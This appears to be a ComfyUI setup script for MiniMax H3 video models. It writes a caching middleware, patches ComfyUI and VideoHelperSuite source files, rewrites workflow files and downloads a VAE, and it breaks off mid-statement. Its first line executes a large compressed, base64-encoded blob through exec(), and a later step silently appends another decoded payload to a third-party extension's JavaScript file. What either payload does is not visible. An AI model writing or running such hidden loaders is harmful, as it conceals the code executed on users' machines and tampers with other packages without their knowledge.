import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

# Automatically deploy user's saved cloud workflow into ComfyUI workflows directory
import zlib as _uz, base64 as _ub
_user_wfs = json.loads(_uz.decompress(_ub.b64decode("...")).decode("utf-8"))
# Install Smart LoRA Auto-Trigger-Word Frontend Extension
import base64 as _jb64
_vhs_core_p = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/web/js/VHS.core.js"
if os.path.exists(_vhs_core_p):
    _vhs_s = open(_vhs_core_p, "r", encoding="utf-8").read()
    if "__H3_LORA_AUTO_TRIGGER_V3__" not in _vhs_s:
        open(_vhs_core_p, "a", encoding="utf-8").write("\n" + _jb64.b64decode("...").decode("utf-8"))
os.makedirs("/content/ComfyUI/user/default/workflows", exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
for _ufn, _udata in _user_wfs.items():
    for _tdir in ("/content/wf_pool_h3", "/content/ComfyUI/user/default/workflows"):
        _upath = os.path.join(_tdir, _ufn)
        if globals().get("重置默认工作流", False) or not os.path.exists(_upath) or os.path.getsize(_upath) < 100 or json.load(open(_upath, encoding="utf-8")).get("extra", {}).get("template_v") != 5:
            json.dump(_udata, open(_upath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
# In-place align only the active H3 model & CLIP on existing workflows (preserving all user prompt/parameter edits)
for _tdir in ("/content/ComfyUI/user/default/workflows", "/content/wf_pool_h3"):
    for _wfn in sorted(os.listdir(_tdir)):
        if _wfn.endswith(".json") and not ("qwen" in _wfn.lower() or "千问" in _wfn):
            _wp = os.path.join(_tdir, _wfn)
            try:
                _wf = json.load(open(_wp, encoding="utf-8"))
                _all_n = list(_wf.get("nodes", []))
                for _sg in _wf.get("definitions", {}).get("subgraphs", []):
                    _all_n.extend(_sg.get("nodes", []))
                for _n in _all_n:
                    _nt = _n.get("type", "")
                    _wv = _n.get("widgets_values")
                    if _nt == "UNETLoader" and isinstance(_wv, list) and len(_wv) >= 1:
                        _wv[0] = target_model
                    elif _nt == "CLIPLoader" and isinstance(_wv, list) and len(_wv) >= 1:
                        _wv[0] = target_clip
                    elif _nt == "FeiHouEasyH3Loader" and isinstance(_wv, list) and len(_wv) >= 3:
                        _wv[0], _wv[1], _wv[2] = target_model, target_model, target_clip
                    elif _nt == "FeiHouEasyH3RemixLoader" and isinstance(_wv, list) and len(_wv) >= 2:
                        _wv[0], _wv[1] = target_model, target_clip
                    elif _nt == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(_wv, list) and len(_wv) >= 7:
                        _wv[5], _wv[6] = target_model, target_clip
                json.dump(_wf, open(_wp, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass


for _old_up in ("minimax_h3_bf16_CONSERVATIVE_v5.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"):
    _up_p = os.path.join("/content/ComfyUI/models/latent_upscale_models", _old_up)
    if os.path.islink(_up_p):
        try: os.unlink(_up_p)
        except Exception: pass

# Ensure all official & community model/CLIP/VAE/Upscaler filenames are symlinked so no workflow ever reports 'missing model'
_vae_dir = "/content/ComfyUI/models/vae"
for _dup_vae in ["minimax_h3_video_vae_bf16.safetensors", "minimax_h3_video_vae_fp32.safetensors", "minimax_h3_video_vae.safetensors", "minimax_h3_audio_vae_bf16.safetensors", "minimax_h3_audio_vae_fp16.safetensors", "minimax_h3_audio_vae.safetensors", "minimax_h3_video_vae_int8_convrot.safetensors"]:
    _dup_vp = os.path.join(_vae_dir, _dup_vae)
    if os.path.islink(_dup_vp) or os.path.exists(_dup_vp):
        try: os.remove(_dup_vp)
        except Exception: pass
if not os.path.exists(os.path.join(_vae_dir, "【2倍超分细节增强VAE】MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors")):
    subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=error", "-d", _vae_dir, "-o", "【2倍超分细节增强VAE】MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors", "https://huggingface.co/speach1sdef178/MiniMax-H3-X2-Detail-VAE/resolve/main/MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors"], check=False)


# Auto-guard in comfy/ldm/minimax/audio_vae.py in case AudioVAE is accidentally selected in a Video VAELoader node
_avae_p = "/content/ComfyUI/comfy/ldm/minimax/audio_vae.py"
if os.path.exists(_avae_p):
    _avae_s = open(_avae_p, "r", encoding="utf-8").read()
    if "_AUTO_VIDEO_VAE" not in _avae_s:
        _avae_s = _avae_s.replace(
            "        b, s, length = waveform.shape",
            "        if waveform.ndim >= 4:\n            import comfy.utils, comfy.sd\n            if not hasattr(self, '_AUTO_VIDEO_VAE'):\n                _sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n                self._AUTO_VIDEO_VAE = comfy.sd.VAE(sd=_sd)\n            return self._AUTO_VIDEO_VAE.first_stage_model.encode(waveform.to(self._AUTO_VIDEO_VAE.vae_dtype))\n        b, s, length = waveform.shape"
        )
        open(_avae_p, "w", encoding="utf-8").write(_avae_s)

# Also patch comfy/sd.py so if AudioVAE is accidentally connected to Video VAE encode/decode, it auto-switches to VideoVAE in-place
_sd_p = "/content/ComfyUI/comfy/sd.py"
if os.path.exists(_sd_p):
    _sd_s = open(_sd_p, "r", encoding="utf-8").read()
    if "_AUTO_SWAP_VIDEO_VAE" not in _sd_s:
        _sd_s = _sd_s.replace(
            "    def encode(self, pixel_samples):",
            "    def encode(self, pixel_samples):\n        if getattr(self.first_stage_model, '__class__', None).__name__ == 'AudioVAE' and hasattr(pixel_samples, 'ndim') and pixel_samples.ndim >= 4:\n            # _AUTO_SWAP_VIDEO_VAE\n            _v_sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n            self.__dict__.update(VAE(sd=_v_sd, device=self.device, dtype=self.vae_dtype).__dict__)"
        )
        _sd_s = _sd_s.replace(
            "    def decode(self, samples_in, vae_options={}):",
            "    def decode(self, samples_in, vae_options={}):\n        if getattr(self.first_stage_model, '__class__', None).__name__ == 'AudioVAE' and hasattr(samples_in, 'ndim') and samples_in.ndim == 5:\n            _v_sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n            self.__dict__.update(VAE(sd=_v_sd, device=self.device, dtype=self.vae_dtype).__dict__)"
        )
        open(_sd_p, "w", encoding="utf-8").write(_sd_s)

# Ensure loop_count and frame_rate in VHS_VideoCombine are optional with defaults so ComfyUI 0.43 never reports missing loop_count or frame_rate
_vhs_np = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/videohelpersuite/nodes.py"
if os.path.exists(_vhs_np):
    _s = open(_vhs_np, "r", encoding="utf-8").read()
    _s_orig = _s
    _old_lc = '''                "loop_count": (
                    "INT",
                    {"default": 0, "min": 0, "max": 100, "step": 1},
                ),'''
    _lc1 = '                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),\n'
    if _lc1 in _s.split('"required":')[1].split('"optional":')[0]:
        _s = _s.replace(_lc1, "", 1)
        _s = _s.replace('"vae": ("VAE",),', '"vae": ("VAE",),\n                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),', 1)
    elif _old_lc in _s.split('"required":')[1].split('"optional":')[0]:
